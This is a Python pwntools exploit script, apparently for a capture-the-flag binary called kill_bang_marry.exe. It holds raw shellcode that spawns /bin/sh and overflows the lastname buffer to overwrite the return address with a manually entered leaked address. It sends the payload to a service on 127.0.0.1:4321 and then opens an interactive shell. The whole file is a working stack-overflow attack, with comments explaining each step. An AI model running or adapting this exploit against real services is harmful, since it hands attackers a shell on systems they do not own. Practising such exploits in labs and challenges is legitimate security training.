'''
Exploit to exploit kill_bang_marry.exe
'''

from pwn import *

# This shellcode spawns a shell when executed
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# In memory the return address is 80 bytes away from the lastname buffer
# so where the lastname buffer starts in memory + 80 bytes is where the return
# address is
offset = 80 - len(shellcode) 

p = remote("127.0.0.1", 4321) # use this for attacking target
#p = process("./kill_bang_marry.exe") # for testing 

print(p.recv())
p.send(b"y\n") # send yes we want to play
print(p.recvuntil('Ready to play!\n\n\n'))
string_address = input("Address:") # enter the leaked address manually
int_address = int(string_address, 16)
address = p64(int_address)

print(f"Address: {address}")

# exploit 
exploit = shellcode + offset*b'A' + address + b'\n'

p.send(b'HAXOR!\n') # send in HAXOR! when asked for firstname
p.send(exploit) # send exploit when asked for lastname

# finish playing kill bang marry
for i in range(8):
    print(p.recv())
    p.send(b"\n")

# exploit should have finished now we should have a shell on target
p.interactive()

p.close()

